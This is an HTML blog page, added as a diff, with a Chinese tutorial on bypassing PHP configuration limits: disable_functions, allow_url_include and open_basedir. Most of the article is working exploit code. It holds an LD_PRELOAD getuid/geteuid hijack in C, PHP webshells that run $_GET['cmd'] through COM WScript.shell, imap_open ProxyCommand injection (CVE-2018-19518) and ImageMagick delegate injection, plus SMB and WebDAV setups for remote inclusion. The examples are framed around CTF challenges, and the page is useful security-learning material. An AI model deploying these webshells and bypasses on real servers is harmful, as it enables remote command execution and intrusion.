@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>绕过php部分配置 - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,php,bypass">
+  
+
+  
+    <meta name="description" content="本篇博客介绍了绕过一些php配置的方法！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="/static/js-css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/static/js-css/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="/static/js-css/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">绕过php部分配置</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/">
+      绕过php部分配置
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2019年11月29日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：1.3k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：6分钟</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/" class="leancloud_visitors" data-flag-title="绕过php部分配置">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+<div class="new-meta-item comments-count">
+  
+  <a href="/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/#comments">
+    <i class="fas fa-comment-dots fa-fw"></i>
+    <span class="valine-comment-count" data-xid="/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/">0</span>
+    <span class="leancloud-comments-count">&nbsp;</span>
+  </a>
+</div>
+
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客介绍了绕过一些php配置的方法！</p>
+<a id="more"></a>
+
+<h2 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h2><p>顾名思义，<code>disable_functions</code>即不能使用的php函数</p>
+<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><code>LD_PRELOAD</code>是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号</p>
+<p>php的<code>mail()</code>函数在执行过程中会默认调用系统程序<code>/usr/sbin/sendmail</code>，而<code>/usr/sbin/sendmail</code>会调用<code>getuid()</code>。如果我们能通过LD_PRELOAD的方式来劫持<code>getuid()</code>，再用<code>mail()</code>函数来触发sendmail程序进而执行被劫持的<code>getuid()</code>，从而就能执行恶意代码了</p>
+<p>捋下思路：</p>
+<ol>
+<li>编写一个原型为 <code>uid_t getuid(void);</code> 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 <code>evil.so</code></li>
+<li>运行 PHP 函数 <code>putenv()</code>，设定环境变量 <code>LD_PRELOAD</code> 为 <code>evil.so</code>，以便后续启动新进程时优先加载该共享对象</li>
+<li>运行 PHP 的 mail() 函数，mail() 内部启动新进程 <code>/usr/sbin/sendmail</code>，由于上一步 <code>LD_PRELOAD</code> 的作用，<code>sendmail</code> 调用的系统函数 <code>getuid()</code> 被优先级更好的 <code>evil.so</code> 中的同名 <code>getuid()</code> 所劫持</li>
+<li>达到不调用 PHP 的各种命令执行函数（<code>system()</code>、<code>exec()</code> 等等）仍可执行系统命令的目的</li>
+</ol>
+<p>怎样编写一个共享库文件呢？</p>
+<p>编写<code>test.c</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int geteuid() &#123;</span><br><span class="line">        const char* cmdline &#x3D; getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line">        if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123; return 0; &#125;</span><br><span class="line">        unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">        system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译生成共享库文件：</p>
+<pre><code>gcc -shared -fPIC test.c -o test.so</code></pre>
+<p>绕过<code>disable_functions</code> github上有个项目</p>
+<p>EXP地址：<a target="_blank" rel="noopener" href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a></p>
+<p>这里面的仓库里有编译生成好的共享库文件，可以直接使用，通过设置<code>EVIL_CMDLINE</code>来执行系统命令</p>
+<p>php利用代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);			&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);	&#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);		&#x2F;&#x2F;用mail函数触发</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这上面有道题（RCE me）我用的就是用的这种方法<a href="http://www.moonback.xyz/2019/11/06/syc-ctf-wp/">http://www.moonback.xyz/2019/11/06/syc-ctf-wp/</a></p>
+<h3 id="COM组件"><a href="#COM组件" class="headerlink" title="COM组件"></a>COM组件</h3><p>需要php配置里开启com.allow_dcom，在php/ext/里面查找是否存在php_com_dotnet.dll这个文件</p>
+<pre><code>extension=php_com_dotnet.dll
+
+com.allow_dcom = true</code></pre>
+<p>EXP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制</p>
+<h3 id="imap-open-CVE-2018-19518"><a href="#imap-open-CVE-2018-19518" class="headerlink" title="imap_open(CVE-2018-19518)"></a>imap_open(CVE-2018-19518)</h3><p>在php.ini中开启<code>imap.enable_insecure_rsh</code>选项为On</p>
+<p>具体原理参见这位大佬的博客：<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#0x07-%E5%88%A9%E7%94%A8imap-open-%E7%BB%95%E8%BF%87">https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#0x07-利用imap-open-绕过</a></p>
+<p>EXP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!function_exists(&#39;imap_open&#39;)) &#123;</span><br><span class="line">        die(&quot;no imap_open function!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$server &#x3D; &quot;x -oProxyCommand&#x3D;echo\t&quot; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &quot;|base64\t-d|sh&#125;&quot;;</span><br><span class="line">&#x2F;&#x2F;$server &#x3D; &#39;x -oProxyCommand&#x3D;echo$IFS$()&#39; . base64_encode($_GET[&#39;cmd&#39;] . &quot;&gt;&#x2F;tmp&#x2F;cmd_result&quot;) . &#39;|base64$IFS$()-d|sh&#125;&#39;;</span><br><span class="line">imap_open(&#39;&#123;&#39; . $server . &#39;:143&#x2F;imap&#125;INBOX&#39;, &#39;&#39;, &#39;&#39;); &#x2F;&#x2F; or var_dump(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="line">sleep(5);</span><br><span class="line">echo file_get_contents(&quot;&#x2F;tmp&#x2F;cmd_result&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><p>这里直接上EXP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Disable functions: &quot; . ini_get(&quot;disable_functions&quot;) . &quot;\n&quot;;</span><br><span class="line">$command &#x3D; isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#39;id&#39;;</span><br><span class="line">echo &quot;Run command: $command\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;;</span><br><span class="line">$data_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);</span><br><span class="line">$imagick_file &#x3D; tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;);</span><br><span class="line">$exploit &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;127.0.0.1&#x2F;image.jpg&quot;|$command&gt;$data_file&quot;)&#39;</span><br><span class="line">pop graphic-context</span><br><span class="line">EOF;</span><br><span class="line">file_put_contents(&quot;$imagick_file&quot;, $exploit);</span><br><span class="line">$thumb &#x3D; new Imagick();</span><br><span class="line">$thumb-&gt;readImage(&quot;$imagick_file&quot;);</span><br><span class="line">$thumb-&gt;writeImage(tempnam(&#39;&#x2F;tmp&#39;, &#39;img&#39;));</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">echo file_get_contents($data_file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="bypass-allow-url-include"><a href="#bypass-allow-url-include" class="headerlink" title="bypass allow_url_include"></a>bypass allow_url_include</h2><p><code>all_url_include</code>即是否允许远程包含，默认关闭</p>
+<h3 id="SMB服务"><a href="#SMB服务" class="headerlink" title="SMB服务"></a>SMB服务</h3><p>安装SAMBA服务器</p>
+<pre><code>apt-get install samba</code></pre>
+<p>创建共享目录</p>
+<pre><code>mkdir /smb
+chmod 0555 /smb/
+chown -R nobody:nogroup /smb/</code></pre>
+<p>配置SAMBA服务器配置文件</p>
+<pre><code>echo &gt; /etc/samba/smb.conf</code></pre>
+<p>其中写入以下内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup &#x3D; WORKGROUP</span><br><span class="line">server string &#x3D; Samba Server %v</span><br><span class="line">netbios name &#x3D; indishell-lab</span><br><span class="line">security &#x3D; user</span><br><span class="line">map to guest &#x3D; bad user</span><br><span class="line">name resolve order &#x3D; bcast host</span><br><span class="line">dns proxy &#x3D; no</span><br><span class="line">bind interfaces only &#x3D; yes</span><br><span class="line"></span><br><span class="line">[ethan]</span><br><span class="line">path &#x3D; &#x2F;smb</span><br><span class="line">writable &#x3D; no</span><br><span class="line">guest ok &#x3D; yes</span><br><span class="line">guest only &#x3D; yes</span><br><span class="line">read only &#x3D; yes</span><br><span class="line">directory mode &#x3D; 0555</span><br><span class="line">force user &#x3D; nobody</span><br></pre></td></tr></table></figure>
+
+<p>重启服务</p>
+<pre><code>service smbd restart </code></pre>
+<p>访问就可以通过<code>\\192.168.23.129\ethan\shell.php</code></p>
+<h3 id="Webdav"><a href="#Webdav" class="headerlink" title="Webdav"></a>Webdav</h3><p>可以在docker里搭一个</p>
+<pre><code>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 8000:80 --rm --name webdav bytemark/webdav</code></pre>
+<p>然后把php文件放到<code>/root/webdav/data/</code>里面，包含<code>//ip:8000//webdav/shell.php</code>就行</p>
+<h2 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h2><p><code>open_basedir</code>即用来对用户访问文件的活动范围限制在指定的区域</p>
+<p>具体内容可以参见大佬的博客<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/">https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/</a></p>
+<h3 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h3><h3 id="symlink-函数"><a href="#symlink-函数" class="headerlink" title="symlink()函数"></a>symlink()函数</h3>
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/>http://www.moonback.xyz/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-01-16T18:03:53+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年1月16日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/php/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>php</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/bypass/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>bypass</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2019/11/29/%E7%9F%A5%E8%AF%86%E7%82%B9/bypass-php-ini/&title=绕过php部分配置 - 明月归的小站&summary=本篇博客介绍了绕过一些php配置的方法！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2019/12/12/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/vulnhub-dc-1/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>VulnHub之DC-1靶机</p>
+                <p class='content'>本篇博客主要记录一下玩VulnHub上的DC-1靶机的过程！！！
+
+
+flag1本地配好环境，这里网络连接我用的是NAT方式
+靶机：192.168.17.149
+kali：192.168.17....</p>
+              </a>
+            
+            
+              <a class='next' href='/2019/11/27/%E7%9F%A5%E8%AF%86%E7%82%B9/reverse-shell/'>
+                <p class='title'>shell和反弹shell<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了shell和反弹shell的一些常见方法以及如何在shell下载文件！
+
+
+反弹shell什么是反弹shell？
+反弹shell，即reverse shell，一般情况下指在本...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-disable-functions"><span class="toc-text">bypass disable_functions</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COM%E7%BB%84%E4%BB%B6"><span class="toc-text">COM组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#imap-open-CVE-2018-19518"><span class="toc-text">imap_open(CVE-2018-19518)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageMagick"><span class="toc-text">ImageMagick</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-allow-url-include"><span class="toc-text">bypass allow_url_include</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1"><span class="toc-text">SMB服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webdav"><span class="toc-text">Webdav</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-text">bypass open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#glob-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">glob:&#x2F;&#x2F;伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#symlink-%E5%87%BD%E6%95%B0"><span class="toc-text">symlink()函数</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
